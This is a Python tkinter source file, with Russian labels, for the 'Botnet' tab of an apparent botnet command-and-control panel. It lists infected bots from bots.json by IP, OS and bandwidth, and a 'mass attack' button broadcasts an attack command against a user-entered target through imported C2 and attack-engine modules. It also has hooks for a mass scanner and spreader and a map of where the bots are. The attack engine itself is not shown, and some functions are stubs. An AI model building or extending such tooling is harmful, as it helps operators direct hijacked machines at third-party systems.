import tkinter as tk
from tkinter import ttk, messagebox
import json
import os
import threading
import time
import folium
import webbrowser

from botnet.c2 import broadcast_command
from engine.attack import AsyncAttackEngine
from utils.logger import log

class BotnetTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.bot_data = []
        self.build_ui()
        self.load_bots()

    def build_ui(self):
        # Верхняя панель управления
        control_frame = tk.Frame(self)
        control_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Button(control_frame, text="Обновить список", command=self.load_bots).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Обновить агент на VPS", command=self.update_agent_vps).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Тепловая карта", command=self.show_heatmap).pack(side=tk.LEFT, padx=2)

        # Фильтр
        filter_frame = tk.Frame(self)
        filter_frame.pack(fill=tk.X, padx=5)
        tk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
        self.filter_entry = tk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())

        # Таблица ботов
        columns = ("ID", "IP", "OS", "Status", "Bandwidth")
        self.tree = ttk.Treeview(self, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
            self.tree.column(col, width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Прогресс-бар
        self.progress = ttk.Progressbar(self, mode="indeterminate")
        self.progress.pack(fill=tk.X, padx=5, pady=2)

        # Статус
        self.status_label = tk.Label(self, text="Ботов: 0")
        self.status_label.pack(anchor=tk.W, padx=5)

    def load_bots(self):
        if os.path.exists("bots.json"):
            with open("bots.json", "r") as f:
                self.bot_data = json.load(f)
        else:
            self.bot_data = []
        self.populate_tree()
        self.status_label.config(text=f"Ботов: {len(self.bot_data)}")

    def populate_tree(self, filtered=None):
        self.tree.delete(*self.tree.get_children())
        data = filtered if filtered is not None else self.bot_data
        for bot in data:
            self.tree.insert("", tk.END, values=(
                bot.get("id", ""),
                bot.get("ip", ""),
                bot.get("os", ""),
                bot.get("status", "offline"),
                f"{bot.get('bandwidth', 0)} Mbps"
            ))

    def apply_filter(self):
        text = self.filter_entry.get().lower()
        if not text:
            self.populate_tree()
            return
        filtered = [b for b in self.bot_data if text in str(b).lower()]
        self.populate_tree(filtered)

    def sort_by(self, col):
        idx = ["id", "ip", "os", "status", "bandwidth"].index(col.lower())
        self.bot_data.sort(key=lambda b: str(b.get(col.lower(), "")))
        self.populate_tree()

    def mass_attack(self):
        # Открывает диалог выбора метода и цели
        target = tk.simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
        if not target:
            return
        self.progress.start()
        threading.Thread(target=self._do_mass_attack, args=(target,)).start()

    def _do_mass_attack(self, target):
        try:
            log(f"Запуск массовой атаки на {target}")
            # Здесь должна быть логика рассылки команды ботам
            broadcast_command({"action": "attack", "target": target})
        finally:
            self.progress.stop()

    def update_agent_vps(self):
        # Заглушка – на будущее можно реализовать обновление агента на VPS
        messagebox.showinfo("Обновление агента", "Функция пока в разработке")

    def mass_scanner(self):
        messagebox.showinfo("Масс-сканер", "Запуск масс-сканера диапазонов...")
        # Здесь можно интегрировать spreader

    def show_heatmap(self):
        locations = []
        for bot in self.bot_data:
            lat, lon = bot.get("lat"), bot.get("lon")
            if lat and lon:
                locations.append((lat, lon))
        if not locations:
            messagebox.showinfo("Карта", "Нет данных о местоположении ботов. Добавьте поле 'lat'/'lon' в bots.json")
            return

        m = folium.Map(location=[0, 0], zoom_start=2)
        for lat, lon in locations:
            folium.CircleMarker([lat, lon], radius=5, color="red", fill=True).add_to(m)
        m.save("heatmap.html")
        webbrowser.open("heatmap.html")
